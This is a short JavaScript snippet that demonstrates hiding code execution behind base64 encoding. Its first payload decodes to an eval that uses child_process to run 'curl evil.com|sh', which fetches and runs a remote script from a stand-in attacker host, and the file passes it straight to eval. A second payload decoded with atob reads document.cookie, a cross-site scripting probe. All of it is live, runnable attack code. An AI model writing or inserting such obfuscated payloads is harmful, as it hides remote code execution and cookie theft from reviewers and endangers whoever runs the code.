// Hidden eval via base64
// "eval('require(\"child_process\").exec(\"curl evil.com|sh\")')" encoded
const payload = "ZXZhbCgncmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImN1cmwgZXZpbC5jb218c2giKScp";
const decoded = Buffer.from(payload, 'base64').toString();
eval(decoded);

// Alternative: atob in browser
const browserPayload = atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ==");
eval(browserPayload);
